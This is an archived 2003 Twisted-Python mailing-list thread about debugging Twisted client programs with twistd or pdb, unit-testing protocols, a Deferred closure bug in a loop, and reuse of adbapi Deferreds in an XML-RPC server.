http://www.twistedmatrix.com/documents/howto/debug-with-emacs
regarding debugging server-type programs (that run under twistd) with
pdb and Emacs.  Apparently twistd installs a special sigint handler
when -b is specified.

However, my program is a client program, and thus does not run under
twistd, has no TAP, etc.  What is the framework for enabling debugging
for that?  And could it be documented in the howto?

Thanks,
John




From m at moshez.org  Wed Jul 30 11:45:20 2003
From: m at moshez.org (Moshe Zadka)
Date: 30 Jul 2003 15:45:20 -0000
Subject: [Twisted-Python] Debugging client programs
In-Reply-To: <871xw8dr5x.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org>
Message-ID: <20030730154520.15330.qmail@green.zadka.com>

On Wed, 30 Jul 2003, John Goerzen <jgoerzen at complete.org> wrote:

> However, my program is a client program, and thus does not run under
> twistd, has no TAP, etc.  What is the framework for enabling debugging
> for that?  And could it be documented in the howto?

You are deluded.
There is absolutely no excuse not to run with twistd. There is no need
for a TAP file: a .tac file (that is, a Python file which defines a variable
named Application) would do just as well. Then, twistd -bony file.tac,
and presto! debuggy goodness.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From itamar at itamarst.org  Wed Jul 30 12:26:44 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 12:26:44 -0400
Subject: [Twisted-Python] Debugging client programs
In-Reply-To: <20030730154520.15330.qmail@green.zadka.com>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
Message-ID: <20030730122644.3d56dd9f.itamar@itamarst.org>

On 30 Jul 2003 15:45:20 -0000
Moshe Zadka <m at moshez.org> wrote:

> On Wed, 30 Jul 2003, John Goerzen <jgoerzen at complete.org> wrote:
> 
> > However, my program is a client program, and thus does not run under
> > twistd, has no TAP, etc.  What is the framework for enabling
> > debugging for that?  And could it be documented in the howto?
> 
> You are deluded.
> There is absolutely no excuse not to run with twistd. There is no need
> for a TAP file: a .tac file (that is, a Python file which defines a
> variable named Application) would do just as well. Then, twistd -bony
> file.tac, and presto! debuggy goodness.

To rephrase, just make a python file with a t.i.app.Application instance
called "application" on the module level. See
http://itamarst.org/writings/OSCON03/twisted_internet-129.html for
details.

twistd can be used just as well for both client and server apps,
although it is most useful for server apps.

You can also, as with *any* regular python script, run "python
/usr/lib/python2.2/pdb.py yourscript.py" on any runnable python script
you have, without making any changes to it. This won't enable one
feature that twistd gives (automatic post-mortem debugging of
exceptions), but is good enough for many cases.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From jeethur at sancharnet.in  Wed Jul 30 14:56:07 2003
From: jeethur at sancharnet.in (Jeethu Rao)
Date: Thu, 31 Jul 2003 00:26:07 +0530
Subject: [Twisted-Python] the right way of unit testing protocols
Message-ID: <000001c356cc$3d768340$5591013d@thilakra>

What is the right way of unit testing protocols in twisted ?
Currently, I'm just subclassing my protocol with unittest.TestCase
And directly calling the dataRecieved with a string and am checking
If the overridden callbacks (like dataRecieved) are called.

The tests pass, but back when I was writing threaded servers,
I would actually setup a server on localhost and would connect to
The server from another thread, for unit testing. That gives me a lot
more confidence.

I know that I can setup two reactors, for the client and the server
and then try to make them talk, But I'm sure there's a shortcut.
I just could'nt figure out the test suites from the Twisted sources.

Jeethu Rao




From itamar at itamarst.org  Wed Jul 30 15:10:39 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 15:10:39 -0400
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <000001c356cc$3d768340$5591013d@thilakra>
References: <000001c356cc$3d768340$5591013d@thilakra>
Message-ID: <20030730151039.02684534.itamar@itamarst.org>

On Thu, 31 Jul 2003 00:26:07 +0530
Jeethu Rao <jeethur at sancharnet.in> wrote:

> What is the right way of unit testing protocols in twisted ?
> Currently, I'm just subclassing my protocol with unittest.TestCase
> And directly calling the dataRecieved with a string and am checking
> If the overridden callbacks (like dataRecieved) are called.

That is indeed a good way to test.

> The tests pass, but back when I was writing threaded servers,
> I would actually setup a server on localhost and would connect to
> The server from another thread, for unit testing. That gives me a lot
> more confidence.

And doing this sort of testing in addition is also a good idea.

> I know that I can setup two reactors, for the client and the server
> and then try to make them talk, But I'm sure there's a shortcut.
> I just could'nt figure out the test suites from the Twisted sources.

You only need one reactor. (And twisted doesn't support multiple
reactors at the moment anyway.) So don't look for that in the code. Just
look at how the tests are done.

In general you'd just do some variant on:

 reactor.listenTCP(1234, myServerFactory)
 reactor.connectTCP("127.0.0.1", 1234, myClientFactory):
 while someConditionIsn'tSet:
     reactor.iterate()
 # at this point some exchange should have finished successfully


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Wed Jul 30 15:44:14 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 30 Jul 2003 13:44:14 -0600
Subject: [Twisted-Python] problems with callback in an iteration
Message-ID: <20030730194414.777F638961@www.fastmail.fm>

In the code below, I create a Trigger object (something I defined) and
call the "make" method on it.  Then I add a callback so that I can "lock"
it after it has been made.  I'm getting some wierd results though.  The
output from the first print statement...

print "trigger name", self.name

...prints the names of the triggers correctly, as they appear in the list
(trigger1 followed by trigger2).  However, the callback to _lock is only
called with the last element in the list (trigger2), but it is called
twice.  So instead of calling _lock on trigger1 and then on trigger2, it
is called twice on trigger2.

Does anyone see what I'm doing wrong?

[snip]
def applyTriggers(self):
	"""Apply the standard triggers to the VOB.
	"""
	deferreds = []
	trigger1 = trigger.PreRmverTrigger("pre_rmver","Prevent removing of versions",config.thisServer,self.tag)
	trigger2 = trigger.PreRmelemTrigger("pre_rmelem","Prevent removing of elements",config.thisServer,self.tag)

	for t in [trigger1, trigger2]:
		print "trigger name:", t.name

		def _lock(results):
			print "*** locking trigger:", t.name
			d = t.lock()
			return d

		d = t.make()
		d.addCallbacks(_lock, log.err)
		deferreds.append(d)
	return defer.DeferredList(deferreds)
[/snip]



From jgoerzen at complete.org  Wed Jul 30 16:45:02 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 15:45:02 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
Message-ID: <87y8yfagmp.fsf@complete.org>

Moshe Zadka <m at moshez.org> writes:

>> twistd, has no TAP, etc.  What is the framework for enabling debugging
>> for that?  And could it be documented in the howto?
>
> You are deluded.
> There is absolutely no excuse not to run with twistd. There is no need
> for a TAP file: a .tac file (that is, a Python file which defines a variable
> named Application) would do just as well. Then, twistd -bony file.tac,
> and presto! debuggy goodness.

That all sounds good, but how to do it?  What does this variable named
Application store?  I have looked at the HOWTOs (which all refer to
objects of type Application) and the APIs, all of which talk about
listening on ports, features of twistd related to running in the
background or not, etc.

Nothing shows how this is to be done with a client.

What's worse, the application HOWTO also doesn't show how to choose
which reactor one is using, which is going to be a critical issue for
me.  I have all these things solved outside the twistd/Application
framework, but am not sure how to do it inside that framework.

Also, I have no objection to running twistd for my debugging, but my
excuse to not running twistd for end-users is that they should not
have to run "twistd /usr/bin/offlineimap" -- they should just run
offlineimap and invoke Python directly.

So, I may be deluded, but hopefully you can see why.

-- John




From itamar at itamarst.org  Wed Jul 30 16:58:06 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 16:58:06 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87y8yfagmp.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
	<87y8yfagmp.fsf@complete.org>
Message-ID: <20030730165806.66c611e6.itamar@itamarst.org>

On Wed, 30 Jul 2003 15:45:02 -0500
John Goerzen <jgoerzen at complete.org> wrote:

> Nothing shows how this is to be done with a client.

Same way exactly.

> What's worse, the application HOWTO also doesn't show how to choose
> which reactor one is using, which is going to be a critical issue for
> me.  I have all these things solved outside the twistd/Application
> framework, but am not sure how to do it inside that framework.

twistd --help should tell you (but, say "twistd --reactor=gtk -y
yourfile.py").

> Also, I have no objection to running twistd for my debugging, but my
> excuse to not running twistd for end-users is that they should not
> have to run "twistd /usr/bin/offlineimap" -- they should just run
> offlineimap and invoke Python directly.

You can have it work both ways, using an if __name__ == '__main__'.
Again, I suggest you read my tutorial, the link to which was on the
previous email (it's on my homepage.) If you want your program to parse
command line arguments this won't work though.

So, you can just use PDB directly, as with *any* python script.
"/usr/lib/python2.2/pdb.py offlineimap.py".

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From bob at redivi.com  Wed Jul 30 16:59:56 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 30 Jul 2003 16:59:56 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87y8yfagmp.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com> <87y8yfagmp.fsf@complete.org>
Message-ID: <C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>

On Wednesday, July 30, 2003, at 4:45PM, John Goerzen wrote:

> Moshe Zadka <m at moshez.org> writes:
>
>>> twistd, has no TAP, etc.  What is the framework for enabling 
>>> debugging
>>> for that?  And could it be documented in the howto?
>>
>> You are deluded.
>> There is absolutely no excuse not to run with twistd. There is no need
>> for a TAP file: a .tac file (that is, a Python file which defines a 
>> variable
>> named Application) would do just as well. Then, twistd -bony file.tac,
>> and presto! debuggy goodness.
>
> That all sounds good, but how to do it?  What does this variable named
> Application store?  I have looked at the HOWTOs (which all refer to
> objects of type Application) and the APIs, all of which talk about
> listening on ports, features of twistd related to running in the
> background or not, etc.
>
> Nothing shows how this is to be done with a client.

Look at itamar's post

>
> What's worse, the application HOWTO also doesn't show how to choose
> which reactor one is using, which is going to be a critical issue for
> me.  I have all these things solved outside the twistd/Application
> framework, but am not sure how to do it inside that framework.

twistd does this when you start the tap.. man twistd

>
> Also, I have no objection to running twistd for my debugging, but my
> excuse to not running twistd for end-users is that they should not
> have to run "twistd /usr/bin/offlineimap" -- they should just run
> offlineimap and invoke Python directly.

make a shell script called offlineimap that runs twistd offlineimap.tap 
instead of python.

-bob




From jgoerzen at complete.org  Wed Jul 30 16:58:43 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 15:58:43 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
 <20030730122644.3d56dd9f.itamar@itamarst.org>
Message-ID: <87smonafzw.fsf@complete.org>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

> To rephrase, just make a python file with a t.i.app.Application instance
> called "application" on the module level. See
> http://itamarst.org/writings/OSCON03/twisted_internet-129.html for
> details.

Thanks for the link, but I'm still not quite sure how to do this on a
client side (there is no listening going on here), nor how to choose a
reactor given this setup.

> You can also, as with *any* regular python script, run "python
> /usr/lib/python2.2/pdb.py yourscript.py" on any runnable python script
> you have, without making any changes to it. This won't enable one

Yup, I'm familiar with pdb and have already used it on my Twisted
code.  One of the problems that I have to figure out is "why was this
callback called and why is it getting crap passed in?"  There's no
stack to show me that answer, and I had hoped that the twistd debug
additions might be of some assistance there.

> feature that twistd gives (automatic post-mortem debugging of
> exceptions), but is good enough for many cases.




From itamar at itamarst.org  Wed Jul 30 17:23:09 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 17:23:09 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
	<87y8yfagmp.fsf@complete.org>
	<C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>
Message-ID: <20030730172309.038c52fa.itamar@itamarst.org>

On Wed, 30 Jul 2003 16:59:56 -0400
Bob Ippolito <bob at redivi.com> wrote:

> make a shell script called offlineimap that runs twistd
> offlineimap.tap instead of python.

Given that you probably want your app to parse command line arguments,
this may not be workable. Which is why we don't require twistd.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From jgoerzen at complete.org  Wed Jul 30 17:30:29 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 16:30:29 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
 <87y8yfagmp.fsf@complete.org>
 <C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>
Message-ID: <87wudzwvm2.fsf@complete.org>

Bob Ippolito <bob at redivi.com> writes:

>> What's worse, the application HOWTO also doesn't show how to choose
>> which reactor one is using, which is going to be a critical issue for
>> me.  I have all these things solved outside the twistd/Application
>> framework, but am not sure how to do it inside that framework.
>
> twistd does this when you start the tap.. man twistd

That's not what I need; I need to be able to choose it in my
program.  It would be a step backwards in usability to force people to
specify this on the command line when the system can detect it
automatically now.

As an example, the app might do something roughly like this:

 1. Am I running in X?  If yes, use wxPython; otherwise:
 2. Are stdin and stdout TTYs?  If yes, use curses; otherwise:
 3. Is stdin a TTY?  If yes, use the TTY interface; otherwise:
 4. Use Noninteractive.

twistd -r does not have the expressivity necessary to convey that
idea, nor does it have the capability of handling it based on a
configuration file.  Also, according to the --help, it also does not
have the capability to use the "add-on" reactors necessary for things
like wxPython.

> make a shell script called offlineimap that runs twistd
> offlineimap.tap instead of python.

I wouldn't be asking if the answer was that obvious!

It's not quite that easy either, because now I have to worry about
where twistd is installed on their system (a detail that setup.py
doesn't take care of for me), making sure I get the one for the
version of Python I want, etc.  This may involve prompting them for it
at install time, and worse, system changes could render OfflineIMAP
un-runable.

As an example, on Debian you can get /usr/bin/twistd2.3 and
/usr/bin/twistd2.2.  /usr/bin/twistd will end up being a symlink to
one or the other.  Now, say I'm writing a cross-platform installer and
I want Python 2.3 or above.  I find a twistd on my path -- maybe it's
what I want, maybe not.  Maybe the one I want isn't on the path.
Maybe it's in /opt/python2.3/bin/twistd or something like that.

If I can stick to importing bits from my plain Python program, all
those problems go away, since the administrator can just run setup.py
under the Python installation that's correct, and there it is.






From jgoerzen at complete.org  Wed Jul 30 17:42:51 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 16:42:51 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
 <87y8yfagmp.fsf@complete.org>
 <20030730165806.66c611e6.itamar@itamarst.org>
Message-ID: <87r847wv1g.fsf@complete.org>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

>> Nothing shows how this is to be done with a client.
> Same way exactly.

I don't see how that can be the case.  All the examples I've seen
involve either listenTCP or a pre-built item that takes an
application.

My client is of a different nature.  It needs to perform tasks at
startup such as evaluating which UI to use, reading its config file (I
know, this could be handled by TAP...), etc.  Then we establish
connections and start doing work.  I can't help but notice that none
of the simple client examples (ie, echoclient.py) aren't written to
use Application.

If it's that simple, if someone could just give me an example, I'd be
very appreciative.

I want to do things the right Twisted way.  But I don't want to make
that an inconvenience on the users.  It seems that the solutions
presented thus far for using twistd for a client will do that, so
that's why I wasn't before.  It's OK with me to not do that; I just
thought it was odd to be called "deluded" for not doing so.

That said, if there is a way to use twistd or its functionality and
avoid these pitfalls, I would be pleased to do that.

>> framework, but am not sure how to do it inside that framework.
>
> twistd --help should tell you (but, say "twistd --reactor=gtk -y
> yourfile.py").

See the other mail I just wrote (that's not quite good enough here).

>> Also, I have no objection to running twistd for my debugging, but my
>> excuse to not running twistd for end-users is that they should not
>> have to run "twistd /usr/bin/offlineimap" -- they should just run
>> offlineimap and invoke Python directly.
>
> You can have it work both ways, using an if __name__ == '__main__'.

Yup, that's fine with me and no problem to run twistd myself; I'd just
prefer to avoid making the end users do that.

> Again, I suggest you read my tutorial, the link to which was on the
> previous email (it's on my homepage.) If you want your program to parse
> command line arguments this won't work though.

Ahh, didn't realize that link was part of a larger thing.  I'll take a
closer look.  (And yes, command-line parsing is a requirement too)

Thanks for your help.

-- John




From warner at lothar.com  Wed Jul 30 17:45:53 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 30 Jul 2003 14:45:53 -0700 (PDT)
Subject: [Twisted-Python] Inheriting Environment (was: Wrapping
 blocking code)
References: <F1634438-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <20030730.144553.59486227.warner@lothar.com>

Glyph Lefkowitz <glyph at twistedmatrix.com> writes:
> 
> I think that the current behavior is fine, and that it shouldn't change.
> Better to err on the side of safety for something like this; make it a FAQ,
> but it's a better FAQ than "I ran a CGI as www-data with the wrong $HOME
> variable and a web user deleted my entire home directory!  What do I do?!?"

*nod*. Added to the FAQ.

 -Brian



From warner at lothar.com  Wed Jul 30 17:56:47 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 30 Jul 2003 14:56:47 -0700 (PDT)
Subject: [Twisted-Python] Twisted and Rendezvous
References: <20030730130240.GC25612@ferd2.thristian.org>
Message-ID: <20030730.145647.21615978.warner@lothar.com>

screwtape at froup.com writes:

> A few weeks ago, someone on the list mentioned Rendezvous support for
> Twisted. Curious, I picked up the Rendezvous specification documents,
> and got to hacking.

That's cool. I'm not sure this falls into the same scope, but it occurred to
me that it would be handy to have a DNS server that provided SRV records
based upon registrations arriving from other server programs. If the
application (say, an HTTP server) launched, started listening on an
arbitrary port, then told the DNS/SRV server its service name and port
number, the DNS server could start feeding appropriate SRV records for the
application.

I'd have the application keep a TCP connection open to the DNS server, and
if that connection went down, the SRV record would be removed. It would work
a lot like dynamic DNS, except per-application instead of per-host.


just looking to plant some idea seeds..
 -Brian



From radix at twistedmatrix.com  Wed Jul 30 18:09:06 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 30 Jul 2003 18:09:06 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87r847wv1g.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com> <87y8yfagmp.fsf@complete.org> <20030730165806.66c611e6.itamar@itamarst.org> <87r847wv1g.fsf@complete.org>
Message-ID: <20030730220906.GE26034@radii>

On Wed, Jul 30, 2003 at 04:42:51PM -0500, John Goerzen wrote:
> I want to do things the right Twisted way.  But I don't want to make
> that an inconvenience on the users.  It seems that the solutions
> presented thus far for using twistd for a client will do that, so
> that's why I wasn't before.  It's OK with me to not do that; I just
> thought it was odd to be called "deluded" for not doing so.

I've written a few clients with Twisted, usually GUI things, and I've
never used twistd. Sometimes it would be possible, but I think in your
case, it's not worth all the hassle. Maybe if someone made a _sane_
programmatic interface to twistd (so you could fire it up after
figuring out which reator you want to use, etc), it would be usable in
this situation, but that doesn't exist.

As for debugging, just run pdb.py on your script.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Wed Jul 30 21:23:14 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 21:23:14 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87smonafzw.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
	<20030730122644.3d56dd9f.itamar@itamarst.org>
	<87smonafzw.fsf@complete.org>
Message-ID: <20030730212314.162c6956.itamar@itamarst.org>

On Wed, 30 Jul 2003 15:58:43 -0500
John Goerzen <jgoerzen at complete.org> wrote:

> Yup, I'm familiar with pdb and have already used it on my Twisted
> code.  One of the problems that I have to figure out is "why was this
> callback called and why is it getting crap passed in?"  There's no
> stack to show me that answer, and I had hoped that the twistd debug
> additions might be of some assistance there.

Hmmm. I don't think we store that information currently, though we could
for Feferreds. Anyway, there's a command in t.p.failure in CVS that
turns on extra debugging (the post-mortem thing). Call that and you will
have same functionaly twistd has in debug mode.

Given your requirements you probably don't want to be using twistd at
all.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From andrew-twisted at puzzling.org  Wed Jul 30 22:09:00 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 31 Jul 2003 12:09:00 +1000
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030730151039.02684534.itamar@itamarst.org>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org>
Message-ID: <20030731020900.GA30331@frobozz>

On Wed, Jul 30, 2003 at 03:10:39PM -0400, Itamar Shtull-Trauring wrote:
> On Thu, 31 Jul 2003 00:26:07 +0530
> Jeethu Rao <jeethur at sancharnet.in> wrote:
> 
> > I know that I can setup two reactors, for the client and the server
> > and then try to make them talk, But I'm sure there's a shortcut.
> > I just could'nt figure out the test suites from the Twisted sources.
> 
> You only need one reactor. (And twisted doesn't support multiple
> reactors at the moment anyway.) So don't look for that in the code. Just
> look at how the tests are done.
> 
> In general you'd just do some variant on:
> 
>  reactor.listenTCP(1234, myServerFactory)
>  reactor.connectTCP("127.0.0.1", 1234, myClientFactory):
>  while someConditionIsn'tSet:
>      reactor.iterate()
>  # at this point some exchange should have finished successfully

Or you can use the loopback module -- twisted.protocols.loopback.  Many of
the Twisted tests do this.

-Andrew.




From glyph at twistedmatrix.com  Wed Jul 30 23:35:00 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Wed, 30 Jul 2003 22:35:00 -0500
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <20030730220906.GE26034@radii>
Message-ID: <F720C9BA-C307-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Wednesday, July 30, 2003, at 05:09 PM, Christopher Armstrong wrote:

> I've written a few clients with Twisted, usually GUI things, and I've
> never used twistd.

For most client-ish things, it's just not appropriate.  I wish it could 
be, but the vaguaries of GUI development prevent it :).

> Sometimes it would be possible, but I think in your
> case, it's not worth all the hassle.

The case where it's useful is when "deployment" is a separate task from 
"installation" - for offlineimap, I don't gather that this is the case.

> Maybe if someone made a _sane_ programmatic interface to twistd (so 
> you could fire it up after
> figuring out which reator you want to use, etc), it would be usable in 
> this situation, but that doesn't exist.

The general idea behind twistd is that it's a unix-centric way of 
managing Twisted services.  It's a daemon.  For an application like 
this, you don't want a daemon, because in at least some circumstances, 
you don't want to daemonize :-).

In general I think that trying to present a programmatic interface to 
twistd is a waste of time.  There should be different service-managing 
programs for different operating systems, and suggesting front-ends to 
twistd will instantly destroy that kind of portability.




From sflist at ihonk.com  Thu Jul 31 00:13:05 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Wed, 30 Jul 2003 21:13:05 -0700
Subject: [Twisted-Python] adbapi weirdness
Message-ID: <200307302113.05020.sflist@ihonk.com>

Hi all,

Here's the latest thing I can't figure out.

If I do this and make an XML-RPC call to dbtest(), it runs fine:

class takeOne(xmlrpc.XMLRPC):
    def __init__(self):
        self.dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", \
		host='127.0.0.1', user='postgres', database='template1')
        self.db = adbapi.Augmentation(self.dbpool)
	self.prefs = Env(self.db)

    def xmlrpc_dbtest(self):
        result = self.db.runQuery("select * from prefs")
        return result

    def xmlrpc_listPrefs(self):
        return self.prefs.prefs

class Env:
    def __init__(self, db):
        self.db = db
        self.prefs = self.db.runQuery("select * from prefs")
	return

def main():
    from twisted.internet.app import Application
    app = Application("xmlrpc")
    r = takeOne()
    app.listenTCP(7080, server.Site(r))
    return app

application = main()

if __name__ == '__main__':
    application.run(save=0)

But a call to listPrefs() hangs until I make another, concurrent request to 
dbtest(), at which point it comes through. Then if I try listPrefs() again, 
it returns Fault 8002: Can't serialize output.

Any ideas? I'm suffering from all kinds of this weirdness: It hangs, then it 
doesn't hang, then it returns properly, then it can't serialize from the same 
function that worked a moment before. :-(

Thanks,

Steve



From itamar at itamarst.org  Thu Jul 31 00:26:06 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 00:26:06 -0400
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <200307302113.05020.sflist@ihonk.com>
References: <200307302113.05020.sflist@ihonk.com>
Message-ID: <20030731002606.793fcad1.itamar@itamarst.org>

On Wed, 30 Jul 2003 21:13:05 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> But a call to listPrefs() hangs until I make another, concurrent
> request to dbtest(), at which point it comes through. Then if I try
> listPrefs() again, it returns Fault 8002: Can't serialize output.

You can't send the same Deferred more than once.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From sflist at ihonk.com  Thu Jul 31 00:30:27 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Wed, 30 Jul 2003 21:30:27 -0700
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <20030731002606.793fcad1.itamar@itamarst.org>
References: <200307302113.05020.sflist@ihonk.com> <20030731002606.793fcad1.itamar@itamarst.org>
Message-ID: <200307302130.27292.sflist@ihonk.com>

> > But a call to listPrefs() hangs until I make another, concurrent
> > request to dbtest(), at which point it comes through. Then if I try
> > listPrefs() again, it returns Fault 8002: Can't serialize output.
> 
> You can't send the same Deferred more than once.

Err, can you give it to me in NewbieSpeaque(tm)? :-)

Steve



From sflist at ihonk.com  Thu Jul 31 00:54:43 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Wed, 30 Jul 2003 21:54:43 -0700
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <20030731002606.793fcad1.itamar@itamarst.org>
References: <200307302113.05020.sflist@ihonk.com> <20030731002606.793fcad1.itamar@itamarst.org>
Message-ID: <200307302154.43654.sflist@ihonk.com>

> > But a call to listPrefs() hangs until I make another, concurrent
> > request to dbtest(), at which point it comes through. Then if I try
> > listPrefs() again, it returns Fault 8002: Can't serialize output.
> 
> You can't send the same Deferred more than once.

Hmm. My impression was that when I did:

result = db.runQuery("select * from foo")

result was a list which contained the result of the query, so I could return 
that as many times as I liked, since it's just a list.

Steve



From andrew-twisted at puzzling.org  Thu Jul 31 01:08:49 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 31 Jul 2003 15:08:49 +1000
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <200307302130.27292.sflist@ihonk.com> <200307302113.05020.sflist@ihonk.com>
References: <200307302113.05020.sflist@ihonk.com> <20030731002606.793fcad1.itamar@itamarst.org> <200307302130.27292.sflist@ihonk.com> <200307302113.05020.sflist@ihonk.com>
Message-ID: <20030731050849.GB30331@frobozz>

On Wed, Jul 30, 2003 at 09:30:27PM -0700, Steve Freitas wrote:
> > > Hi all,
> > > 
> > > Here's the latest thing I can't figure out.
> > > 
> > > If I do this and make an XML-RPC call to dbtest(), it runs fine:
> > > 
> > > class takeOne(xmlrpc.XMLRPC):
> > >     def __init__(self):
> > >         self.dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", \
> > >           host='127.0.0.1', user='postgres', database='template1')
> > >         self.db = adbapi.Augmentation(self.dbpool)
> > >         self.prefs = Env(self.db)
[...]
> > > 
> > >     def xmlrpc_listPrefs(self):
> > >         return self.prefs.prefs
> > > 
> > > class Env:
> > >     def __init__(self, db):
> > >         self.db = db
> > >         self.prefs = self.db.runQuery("select * from prefs")
[...]
> > > But a call to listPrefs() hangs until I make another, concurrent
> > > request to dbtest(), at which point it comes through. Then if I try
> > > listPrefs() again, it returns Fault 8002: Can't serialize output.
> > 
> > You can't send the same Deferred more than once.
> 
> Err, can you give it to me in NewbieSpeaque(tm)? :-)

I'll try :)

runQuery returns a Deferred.  If you don't know what that is, you're going
to run into bigger problems than just this, so speak up now :) -- and read:
    twistedmatrix.com/documents/howto/defer

Now, for twisted.web.xmlrpc to get the results of your deferred, it has to
add a callback to it.  This callback consumes the result of your deferred
(although I don't see any reason why this *has* to be the case, necessarily,
but I can see how it could avoid confusing errors, so it's probably a good
idea).  This means that the next callback added to that deferred will get a
result of None, which can't be represented in XML-RPC, hence the error.

One way to work around this would be something like this (completely
untested, of course...):

----
from twisted.web import xmlrpc
from twisted.internet import defer
from twisted.python import log
from twisted.enterprise import adbapi

class TakeOne(xmlrpc.XMLRPC):
    def __init__(self):
        self.dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", \
                host='127.0.0.1', user='postgres', database='template1')
        self.db = adbapi.Augmentation(self.dbpool)
        self.prefs = Env(self.db)

    def xmlrpc_listPrefs(self):
        return self.prefs.getPrefs()

class Env:
    def __init__(self, db):
        self.db = db
        self.prefs = None
        self.outstandingRequests = []
        self.d = self.db.runQuery("select * from prefs")
        d.addCallbacks(self._cb, self._eb)

    def getPrefs(self):
        if self.prefs is not None:
            return self.prefs
        else:
            d = defer.Deferred()
            self.outstandingRequests.append(d)
            return d

    def _cb(self, result):
        self.prefs = results
        for d in self.outstandingRequests:
            d.callback(result)
        del self.outstandingRequests[:]

    def _eb(self, failure):
        self.prefs = results
        log.err(failure)
----

-Andrew.




From Rudy.Schockaert at pandora.be  Thu Jul 31 02:26:53 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Thu, 31 Jul 2003 08:26:53 +0200
Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
Message-ID: <3F28B6AD.6050403@pandora.be>

Hi,

anyone who knows when the first Python 2.3 build of twisted for windows 
will be available? Which version will it be?

I tried to build it myself but got into trouble. I first installed 
